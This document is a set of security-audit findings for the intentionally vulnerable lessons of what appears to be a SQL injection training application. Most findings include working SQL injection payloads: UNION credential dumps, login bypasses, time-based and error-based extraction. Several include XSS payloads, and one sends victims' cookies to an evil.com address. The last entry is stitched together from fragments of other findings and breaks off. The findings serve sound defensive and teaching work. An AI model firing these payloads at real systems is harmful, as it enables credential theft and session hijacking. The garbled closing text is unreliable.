findings.title: Unauthenticated SQL injection via unsanitized $_GET['id'] into SELECT query
findings.description: The `id` parameter is read directly from `$_GET['id']` (line 20) with no sanitization or validation. It is then interpolated into a SQL query string on line 26: `$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";`. This string is passed directly to `mysql_query()` on line 27. Because `$id` is enclosed in single quotes in the query, an attacker need only supply a `'` to break out of the string literal and inject arbitrary SQL. Additionally, line 38 (`print_r(mysql_error())`) echoes the full MySQL error back to the response, enabling error-based data exfiltration.
findings.exploit_scenario: An attacker sends a GET request to `Less-1.php?id=1' UNION SELECT 1,username,password FROM users -- -`. The single quote closes the string literal, the UNION clause appends arbitrary query results, and `-- -` comments out the remainder. The injected query executes as `SELECT * FROM users WHERE id='1' UNION SELECT 1,username,password FROM users -- -' LIMIT 0,1`, leaking all usernames and passwords from the database. Because `mysql_error()` is printed on failure, error-based techniques (e.g., `extractvalue()`) also work for blind data exfiltration.
findings.recommendation: Use parameterized queries (prepared statements) instead of string interpolation. For example, with PDO: `$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ? LIMIT 0,1"); $stmt->execute([$id]);`. Additionally, do not expose `mysql_error()` output to end users.

findings.title: SQL injection via GET parameter 'id' with double-quote string concatenation
findings.description: The user-controlled GET parameter `id` is read on line ~20 (`$id=$_GET['id']`), wrapped in double quotes on line ~27 (`$id = '"'.$id.'"';`), then directly interpolated into a SQL query on line ~28 (`$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";`). There is no sanitization, escaping, or parameterization. The query is executed on line ~29 via `mysql_query($sql)`. Because the application suppresses error output (line ~41: `//print_r(mysql_error())`) and both branches of the result check print the same string ("You are in..........."), this is a blind/time-based injection vector, consistent with the page title.
findings.exploit_scenario: An attacker sends a request such as `GET /Less-10.php?id=1" AND SLEEP(5)--+`. The resulting query becomes `SELECT * FROM users WHERE id="1" AND SLEEP(5)--+" LIMIT 0,1`. The server delays the response by 5 seconds, confirming injection. The attacker then iterates with conditional time delays (e.g., `SLEEP(IF(ASCII(SUBSTRING(database(),1,1))>64,5,0))`) to exfiltrate the entire database contents — usernames, password hashes, and any other stored data — one character at a time.
findings.recommendation: Use parameterized queries (prepared statements) instead of string concatenation. Replace the `mysql_*` API (deprecated/removed in modern PHP) with PDO or mysqli, and bind `$id` as a parameter: `$stmt = $pdo->prepare('SELECT * FROM users WHERE id = :id LIMIT 0,1'); $stmt->execute(['id' => $id]);`. Additionally, validate that `id` is a numeric value before any database interaction.

findings.title: SQL injection via unsanitized POST parameters in login query
findings.description: Untrusted user input from $_POST['uname'] and $_POST['passwd'] (lines ~41-42) is concatenated directly into a SQL query without any sanitization or parameterization. The values are wrapped only in double-quote characters (lines ~51-52) and placed inside parentheses in the WHERE clause (line 53): `$uname='"'.$uname.'"';` then `SELECT ... WHERE username=($uname) and password=($passwd)`. The resulting query is executed via mysql_query() on line 54. An attacker can break out of the `"` and `()` context to inject arbitrary SQL.
findings.exploit_scenario: An attacker sends POST data with uname set to `") OR 1=1 -- ` and any password. The constructed query becomes: `SELECT username, password FROM users WHERE username=("") OR 1=1 -- ") and password=("...") LIMIT 0,1`. This bypasses authentication entirely, returning the first user's row and displaying the login success page with credentials and the flag image.
findings.recommendation: Use prepared statements with parameterized queries (e.g., PDO or mysqli with bind_param). Never concatenate user input directly into SQL strings.

findings.title: Reflected XSS through SQL error message output
findings.description: When the SQL query fails, mysql_error() is printed directly to the HTML response on line 68 via print_r(mysql_error()) with no HTML encoding. MySQL error messages typically include a fragment of the malformed query, which contains the attacker-controlled uname/passwd values. An attacker who injects both SQL syntax and HTML/JavaScript into the uname or passwd fields can cause the error message to include their malicious HTML, which is then rendered in the victim's browser.
findings.exploit_scenario: An attacker sends POST data with uname set to `"><script>alert(document.cookie)</script>`. The invalid SQL causes mysql_error() to return a message containing the attacker's input, which is rendered as-is in the HTML page, executing arbitrary JavaScript in the victim's browser context.
findings.recommendation: HTML-encode all output including error messages with htmlspecialchars() before rendering. Additionally, do not expose raw database error messages to end users in production.

findings.title: Unparameterized SQL query using raw POST parameters enables full authentication bypass and data exfiltration
findings.description: Lines 47–50 read `$_POST['uname']` and `$_POST['passwd']` directly into `$uname` and `$passwd` with no sanitization, escaping, or parameterization. These variables are then interpolated into a SQL query string on line 55: `SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1`. The resulting string is passed to `mysql_query()` on line 56. An attacker controls both `$uname` and `$passwd` entirely, allowing arbitrary SQL injection via either parameter.
findings.exploit_scenario: An attacker sends a POST request with `uname=admin'-- ` and any password. The resulting query becomes `SELECT username, password FROM users WHERE username='admin'-- ' and password='...' LIMIT 0,1`, commenting out the password check and authenticating as `admin`. Alternatively, `uname=' UNION SELECT 1,2-- ` exfiltrates arbitrary data. Error-based extraction is also possible since `mysql_error()` output is printed on line 77.
findings.recommendation: Use parameterized/prepared statements (PDO or mysqli) instead of string interpolation. Replace the query with: `$stmt = $pdo->prepare("SELECT username, password FROM users WHERE username=? AND password=? LIMIT 0,1"); $stmt->execute([$uname, $passwd]);`

findings.title: Reflected XSS via mysql_error() output containing attacker-controlled SQL injection payload
findings.description: When the SQL query on line 55 fails, line 77 calls `print_r(mysql_error())` which outputs the raw MySQL error into the HTML response. MySQL error messages frequently include fragments of the malformed query that caused the error, which contains attacker-controlled input from `$uname` or `$passwd` (lines 47–50). This creates a reflected XSS path: attacker-controlled text → SQL string → MySQL error message → HTML output.
findings.exploit_scenario: An attacker sends a POST request with `uname=<script>alert(document.cookie)</script>` and observes that if the injected content appears in the MySQL error message, the script executes in the victim's browser. Alternatively, the injection `uname=' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x3c7363726970743e616c65727428293c2f7363726970743e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- ` leverages error-based SQL injection to inject a `<script>alert()</script>` tag into the error output rendered in the page.
findings.recommendation: Escape all output with `htmlspecialchars()` before echoing. Additionally, do not expose raw database error messages to end users — log them server-side instead and display a generic error.

findings.title: SQL injection via unsanitized POST parameters in authentication query
findings.description: The untrusted POST parameters `uname` and `passwd` are taken directly from `$_POST` at lines 37-38 with no sanitization or parameterization. They are interpolated into a SQL query string at line 43: `SELECT username, password FROM users WHERE username=('$uname') and password=('$passwd') LIMIT 0,1`. The resulting query is executed at line 44 via `mysql_query()`. On authentication failure (line 63), `mysql_error()` is printed to the page, providing the attacker with DB error messages that enable error-based data extraction.
findings.exploit_scenario: An attacker sends a POST request with `uname=admin') OR 1=1-- -` and an arbitrary `passwd`. This closes the parenthesized string literal and comments out the remainder of the query, bypassing authentication. Alternatively, for data exfiltration, the attacker uses error-based injection such as `uname=') AND ExtractValue(1,CONCAT(0x7e,(SELECT version())))-- -`, leveraging the `mysql_error()` output on line 63 to read arbitrary database contents.
findings.recommendation: Use parameterized queries (prepared statements) instead of string interpolation. Replace the deprecated `mysql_*` API with PDO or mysqli, and bind user inputs as parameters. Remove or suppress `mysql_error()` output in production.

findings.title: Double-quote string SQL injection in POST login parameters
findings.description: Untrusted POST parameters `uname` and `passwd` are taken directly from `$_POST` (lines 36–37), wrapped in double-quote characters (lines 46–47: `$uname='"'.$uname.'"';` / `$passwd='"'.$passwd.'"';`), and interpolated into a SQL query on line 48 without any sanitization or escaping. The resulting query is executed via the deprecated `mysql_query()` on line 49. When the query fails, `mysql_error()` is printed to the response on line 72, providing the attacker with DBMS error messages for error-based data extraction. The double-quote wrapping (as opposed to single-quote in other lessons) is the only enclosure; an attacker closes the double-quote to inject arbitrary SQL.
findings.exploit_scenario: An attacker sends a POST request with `uname` set to `" OR 1=1 -- ` and `passwd` set to anything. The constructed query becomes: `SELECT username, password FROM users WHERE username="" OR 1=1 -- "" and password="..." LIMIT 0,1`. The `OR 1=1` makes the WHERE clause always true, the `-- ` comments out the rest, and the first user row is returned — bypassing authentication entirely. For data exfiltration, the attacker uses error-based double injection (as the lab title suggests): `uname` = `" AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT password FROM users LIMIT 0,1),0x3a,FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x)a) -- `, leveraging the `mysql_error()` output on line 72 to read arbitrary database contents.
findings.recommendation: Use parameterized/prepared statements (e.g., PDO or mysqli with bind_param) instead of string interpolation. Replace the deprecated mysql_* API. At minimum, apply `mysql_real_escape_string()` to both `$uname` and `$passwd` before interpolation, though parameterized queries are strongly preferred.

findings.title: Blind boolean-based SQL injection via unsanitized POST parameters in login query
findings.description: The `uname` and `passwd` POST parameters are taken directly from user input (lines where `$uname=$_POST['uname']` and `$passwd=$_POST['passwd']`) and interpolated without any sanitization or escaping into a SQL query string on the line: `@$sql="SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1";`. This query is then executed via `mysql_query($sql)`. An attacker controls both the username and password fields completely, enabling full boolean-based blind SQL injection. The application differentiates only between "logged in" (flag image) and "failed" (slap image) responses, making this a boolean-based blind injection vector.
findings.exploit_scenario: An attacker submits `uname=admin' OR '1'='1' -- ` and `passwd=x` via POST to bypass authentication and log in as the first user. For data exfiltration, the attacker submits `uname=admin' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a' -- ` and observes whether the success or failure image is returned, iterating character by character to extract the entire password hash.
findings.recommendation: Use parameterized/prepared statements instead of string interpolation. Replace `mysql_query` (deprecated/removed) with PDO or mysqli prepared statements: `$stmt = $pdo->prepare("SELECT username, password FROM users WHERE username=? AND password=? LIMIT 0,1"); $stmt->execute([$uname, $passwd]);`. Additionally, validate input length and character whitelist before use.

findings.title: Blind time-based SQL injection via double-quoted string breakout in login parameters
findings.description: User-controlled POST parameters `uname` and `passwd` are taken directly from $_POST (lines 55-56), wrapped in double quotes (lines 63-64), and interpolated unsanitized into a SQL SELECT query (line 65): `$sql="SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1";`. There is no escaping, parameterization, or input validation. An attacker can break out of the double-quoted string and parenthesis context by supplying `"` and `)` characters, then inject arbitrary SQL.
findings.exploit_scenario: An attacker sends a POST request with uname set to `admin") OR SLEEP(5)-- ` and any passwd value. The resulting query becomes: `SELECT username, password FROM users WHERE username=("admin") OR SLEEP(5)-- ") and password=("...") LIMIT 0,1`. This allows blind time-based data exfiltration of the entire database. Alternatively, authentication bypass is achieved with uname=`") OR 1=1-- ` which makes the WHERE clause always true, granting access without valid credentials.
findings.recommendation: Use parameterized queries (prepared statements) with mysqli or PDO. Replace the string interpolation on line 65 with placeholder binding: `$stmt = $pdo->prepare("SELECT username, password FROM users WHERE username=? AND password=? LIMIT 0,1"); $stmt->execute([$uname, $passwd]);`

findings.title: User credentials written to cleartext log file
findings.description: Lines 59-62 open `result.txt` in append mode and write the raw username and password submitted via POST (`$uname` and `$passwd`) to the file. This persists submitted credentials (including injection payloads) to disk in cleartext, readable by any process with filesystem access.
findings.exploit_scenario: An attacker who achieves local file read (e.g., via LFI in another component) can read `result.txt` to harvest all submitted usernames, passwords, and injection payloads, including legitimate user credentials entered by other users.
findings.recommendation: Remove the credential logging. If debugging is necessary, log only non-sensitive metadata and use a secured log destination with restricted permissions.

findings.title: SQL injection via unsanitized passwd parameter in UPDATE query
findings.description: The `passwd` POST parameter is taken directly from user input (line ~58: `$passwd=$_POST['passwd'];`) and interpolated without any sanitization into an UPDATE SQL statement on line 70: `$update="UPDATE users SET password = '$passwd' WHERE username='$row1'";`. By contrast, `uname` is properly sanitized through `check_input()` (which applies `mysql_real_escape_string`). The `passwd` value bypasses all escaping. Additionally, MySQL errors (including those triggered by the injected SQL) are echoed back to the user via `print_r(mysql_error())` on line 78, enabling error-based data exfiltration.
findings.exploit_scenario: An attacker sends a POST request to Less-17.php with `uname=admin` (a valid username) and `passwd=' OR (SELECT 1 FROM (SELECT count(*), CONCAT((SELECT version()), 0x3a, FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) y)-- -`. The unsanitized passwd breaks out of the string literal in the UPDATE, injects a subquery that produces a duplicate-key error leaking the database version, and the error is rendered on the page. This can be iterated to extract any data (credentials, schemas). Alternatively, `passwd=' OR '1'='1` resets every user's password.
findings.recommendation: Apply the same `check_input()` sanitization to `$_POST['passwd']` before interpolating it into the SQL query, or preferably migrate to prepared statements with parameterized queries (e.g., PDO or mysqli with bind_param).

findings.title: SQL injection via unsanitized HTTP Referer header in INSERT statement
findings.description: The user-supplied HTTP Referer header is read on line 52 (`$uagent = $_SERVER['HTTP_REFERER']`) without any sanitization. While `uname` and `passwd` are sanitized through `check_input()`, the Referer value is interpolated directly into a SQL INSERT statement on line 76: `$insert="INSERT INTO \`security\`.\`referers\` (\`referer\`, \`ip_address\`) VALUES ('$uagent', '$IP')";`. This is executed via `mysql_query($insert)` on line 77. Additionally, `mysql_error()` is printed on line 83, enabling error-based extraction. The attacker must supply valid credentials to reach the vulnerable INSERT branch (the `$row1` check on line 70).
findings.exploit_scenario: An attacker who knows valid credentials (e.g., admin/admin) sends a POST request to Less-19.php with a malicious Referer header such as `Referer: ' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT password FROM users LIMIT 0,1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) AND '1'='1`. The injected subquery executes on the database, and the error message returned by `mysql_error()` on line 83 leaks the queried data to the attacker.
findings.recommendation: Apply `check_input()` or equivalent parameterized query to the Referer value before including it in the SQL statement. Better yet, use prepared statements with bound parameters for the INSERT query.

findings.title: Reflected XSS via unsanitized HTTP Referer header echoed to page
findings.description: The attacker-controlled `HTTP_REFERER` value stored in `$uagent` is echoed directly into the HTML output on line 81: `echo 'Your Referer is: ' .$uagent;`. There is no HTML entity encoding or output escaping. An attacker who can send a crafted Referer header (via a redirecting page or a browser extension, or via the SQL injection from F-19-01 to store a payload) can inject arbitrary HTML/JavaScript. This is reachable only after successful authentication (valid `uname`/`passwd`).
findings.exploit_scenario: An attacker sends a POST request with valid credentials and a Referer header containing `Referer: <script>alert(document.cookie)</script>`. When the page renders, the script executes in the victim's browser context, allowing session cookie theft. In practice, triggering XSS via a request header typically requires MITM or server-side stored injection; however, since this is also a stored XSS path (the Referer is INSERTed into the database on line 76), a prior SQL injection could store a script payload that renders on later admin pages.
findings.recommendation: HTML-entity-encode the Referer value before echoing it: `echo 'Your Referer is: ' . htmlspecialchars($uagent, ENT_QUOTES, 'UTF-8');`.

findings.title: Error-based SQL injection via User-Agent header in INSERT statement
findings.description: The User-Agent HTTP header (`$_SERVER['HTTP_USER_AGENT']`) is assigned to `$uagent` at line 70 with no sanitization. On line 107, `$uagent` is directly interpolated into an INSERT SQL statement: `"INSERT INTO security.uagents (uagent, ip_address, username) VALUES ('$uagent', '$IP', $uname)"`. This value is then passed to `mysql_query()` on line 108. Although `uname` and `passwd` are sanitized via `check_input()`, the User-Agent header is not. After the query executes, `print_r(mysql_error())` on line 116 leaks database error messages to the response, enabling error-based data extraction. The injection only fires when the authentication check on line 104 (`if($row1)`) succeeds, meaning the attacker must supply valid credentials first.
findings.exploit_scenario: An attacker who knows (or guesses) valid credentials sends a POST request with correct uname/passwd and sets the User-Agent header to a payload such as: `' OR extractvalue(1,concat(0x7e,(SELECT version()))) OR '1'='1`. After successful authentication, the INSERT query becomes malformed, and the MySQL error printed at line 116 reveals the extracted database version (or any other data the attacker queries) in the HTTP response body.
findings.recommendation: Sanitize the User-Agent value before embedding it in the SQL query. Apply `mysql_real_escape_string()` to `$uagent` the same way `check_input()` handles other inputs, or better yet, use parameterized queries (prepared statements) for the INSERT operation.

findings.title: Reflected XSS via unsanitized User-Agent header echoed in HTML response
findings.description: The User-Agent header value stored in `$uagent` (line 70: `$uagent = $_SERVER['HTTP_USER_AGENT']`) is echoed directly into the HTML response at line 113 without HTML entity encoding: `echo 'Your User Agent is: ' .$uagent;`. This output occurs inside the authenticated branch (line 104), so valid credentials are required. An attacker can inject arbitrary HTML/JavaScript via the User-Agent header.
findings.exploit_scenario: An attacker sends a POST request with valid credentials and sets the User-Agent header to `<script>alert(document.cookie)</script>`. When the server responds after successful login, the script executes in the victim's browser, potentially stealing session cookies. This could be exploited in combination with a proxy or by tricking a victim into sending a crafted request through a redirect/poisoned proxy.
findings.recommendation: HTML-encode the User-Agent value before outputting it using `htmlspecialchars($uagent, ENT_QUOTES, 'UTF-8')` at line 113.

findings.title: Unparameterized SQL query with direct GET input concatenation
findings.description: The `id` parameter is read from `$_GET['id']` on line 25 (`$id=$_GET['id']`) with no sanitization, casting, or escaping. It is then directly interpolated into a SQL query on line 31: `$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";`. This query is executed on line 32 via `mysql_query($sql)`. Because the value is not quoted in the query string, no quote breakout is even required. Additionally, line 45 echoes `mysql_error()` to the user, enabling error-based data exfiltration.
findings.exploit_scenario: An attacker sends a GET request to `Less-2.php?id=1 UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()-- -`. Because `$id` is inserted raw into the SQL string, the resulting query executes the attacker's UNION statement, leaking all table names in the current database. The output is rendered on-screen via the `$row['username']` / `$row['password']` echo on lines 36-38, or via `mysql_error()` on line 45 for error-based techniques.
findings.recommendation: Use parameterized queries (PDO or mysqli prepared statements) instead of string interpolation. For example: `$stmt = $pdo->prepare('SELECT * FROM users WHERE id = ? LIMIT 0,1'); $stmt->execute([$id]);`. At minimum, cast `$id` to an integer with `$id = intval($_GET['id']);` and suppress `mysql_error()` output.

findings.title: SQL Injection via unsanitized Cookie value in authentication bypass query
findings.description: The cookie parameter `uname` is read from `$_COOKIE['uname']` (~line 96) without any sanitization — unlike the POST parameters which pass through `check_input()`. The raw value is interpolated directly into a SQL query at ~line 109: `$sql="SELECT * FROM users WHERE username='$cookee' LIMIT 0,1";`. This string is then passed to `mysql_query()` at ~line 110. An attacker who sets a malicious cookie can break out of the string literal and inject arbitrary SQL. The mysql_error() output is also reflected to the page, enabling error-based data exfiltration.
findings.exploit_scenario: An attacker authenticates once (or crafts a cookie without prior auth) and sets the Cookie header to e.g. `uname=admin' UNION SELECT 1,username,password FROM users-- -`. Upon loading the page, the injected query executes and the attacker reads usernames and passwords from every row in the users table via the error-based or UNION-based response.
findings.recommendation: Apply the same `check_input()` sanitization used for POST parameters to the cookie value, or preferably use parameterized queries (prepared statements) with PDO or mysqli.

findings.title: Reflected XSS via User-Agent header echoed without encoding
findings.description: At ~line 103, the code does `echo "YOUR USER AGENT IS : ".$_SERVER['HTTP_USER_AGENT'];`. The `HTTP_USER_AGENT` value is entirely attacker-controlled via the HTTP request header and is printed into the HTML response without any HTML-entity encoding. This triggers when a valid `uname` cookie is set and `$_POST['submit']` is not set (the default authenticated view).
findings.exploit_scenario: An attacker who can induce a victim to visit the page (or targets themselves during a reflected-XSS-to-session-hijack chain) sends a request with the User-Agent header set to `<script>document.location='http://evil.com/steal?c='+document.cookie</script>`. The script executes in the victim's browser, exfiltrating the `uname` cookie (and any other cookies) to the attacker.
findings.recommendation: Escape all server-variable output with `htmlspecialchars($_SERVER['HTTP_USER_AGENT'], ENT_QUOTES, 'UTF-8')` before echoing, or use a template engine that auto-escapes.

findings.title: Reflected XSS via Cookie value echoed without encoding
findings.description: At ~line 108, the code outputs `echo "YOUR COOKIE : uname = $cookee and expires: " . date($format, $timestamp);` where `$cookee` comes directly from `$_COOKIE['uname']` (~line 96). The cookie value is attacker-controlled and is embedded in the HTML response without `htmlspecialchars()` or any encoding.
findings.exploit_scenario: An attacker crafts a URL or sets the victim's cookie (via another XSS, subdomain cookie injection, or physical access) to `uname=<script>alert(document.cookie)</script>`. When the victim visits the page, the script executes in their browser context.
findings.recommendation: Apply `htmlspecialchars($cookee, ENT_QUOTES, 'UTF-8')` before echoing the cookie value in HTML output.

findings.title: Cookie-based SQL injection via base64-decoded uname without sanitization
findings.description: The attacker-controlled cookie `uname` is read on line 62 (`$cookee = $_COOKIE['uname']`), base64-decoded on line 78 (`$cookee = base64_decode($cookee)`), and then directly interpolated into a SQL query on line 80: `$sql="SELECT * FROM users WHERE username=('$cookee') LIMIT 0,1";`. Unlike the POST path (lines 55-56) which passes inputs through `check_input()` with `mysql_real_escape_string`, the cookie path applies no sanitization or escaping whatsoever. The base64 encoding provides no protection because the attacker fully controls the cookie value and can supply any base64-encoded payload.
findings.exploit_scenario: An attacker sets the `uname` cookie to a base64-encoded SQL injection payload such as `base64("admin') UNION SELECT 1,2,3 -- ")`. On the next page load, the `else` branch executes (since the cookie exists), decodes the cookie, and embeds the injected SQL directly into the SELECT statement, enabling full extraction of database contents.
findings.recommendation: Apply the same `check_input()` sanitization used for POST parameters to the base64-decoded cookie value before interpolating it into the SQL query. Better yet, use parameterized queries (prepared statements) via PDO or mysqli to eliminate the injection class entirely.

findings.title: Reflected XSS via unsanitized cookie value echoed in HTML
findings.description: The raw value of `$_COOKIE['uname']` is assigned to `$cookee` on line 62 and echoed directly into HTML on line 75: `echo "YOUR COOKIE : uname = $cookee and expires: " . date(...)`. The cookie value is attacker-controlled and is output without HTML encoding. Although the server sets the cookie via `base64_encode()` on line 47, an attacker can manually set any arbitrary value for the cookie, including HTML/JavaScript payloads. The echo occurs before the `base64_decode` on line 78, so no filtering happens on the raw value.
findings.exploit_scenario: An attacker crafts an HTTP request with a cookie header `uname=<script>alert(document.cookie)</script>`. When the page is rendered, the script tag is injected into the HTML body and executes in the victim's browser. If an attacker can get a victim to visit a URL that sets this cookie (or via a cookie-tossing attack), session theft is possible.
findings.recommendation: HTML-encode all user-controlled data before echoing it using `htmlspecialchars($cookee, ENT_QUOTES, 'UTF-8')`.

findings.title: Reflected XSS via User-Agent header echoed without encoding
findings.description: The `$_SERVER['HTTP_USER_AGENT']` value is echoed directly into the HTML response on line 72: `echo "YOUR USER AGENT IS : ".$_SERVER['HTTP_USER_AGENT'];`. The User-Agent header is fully attacker-controlled via HTTP request headers and is output with no sanitization or HTML encoding.
findings.exploit_scenario: An attacker sends an HTTP request with `User-Agent: <script>alert(document.cookie)</script>`. The script tag is rendered into the page and executes in the context of the victim's browser, enabling session hijacking or other JavaScript-based attacks.
findings.recommendation: HTML-encode the User-Agent value before output: `htmlspecialchars($_SERVER['HTTP_USER_AGENT'], ENT_QUOTES, 'UTF-8')`.

findings.title: SQL injection via $_GET['id'] with insufficient comment-filter bypass
findings.description: The user-controlled parameter `$_GET['id']` (line 19) is filtered only by stripping `#` (line 23) and `--` (line 24) comment sequences. The resulting `$id` is then directly interpolated into a SQL query string on line 33: `$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";`. Because the value is wrapped in single quotes but no escaping or parameterization is applied, an attacker can break out of the string context without needing any comment characters. Additionally, `mysql_error()` output is printed to the user on line 44, enabling error-based data exfiltration.
findings.exploit_scenario: An attacker sends a GET request such as `?id=' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database() OR '1'='1`. The single-quoted injection breaks out of the `id='...'` context, appends a UNION SELECT to enumerate database tables, and balances the trailing quote with `OR '1'='1` — no comment characters (`#` or `--`) are needed. Database schema and contents are returned directly in the page response.
findings.recommendation: Use parameterized queries (prepared statements) instead of string interpolation. findings.description: User input from $_GET['id'] (line ~18) flows through a blacklist filter (lines 64-76) then is concatenated directly into a SQL query at line 34: `$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1"`. The blacklist is trivially bypassable in two ways: (1) **Double-write bypass**: each `preg_replace` runs only once, so `selselectect` → `select` and `ununionion` → `union` after the inner keyword is stripped. findings.title: SQL injection via GBK multibyte charset bypass of addslashes

findings.recommendation: Use parameterized queries (prepared statements) instead of string escaping.
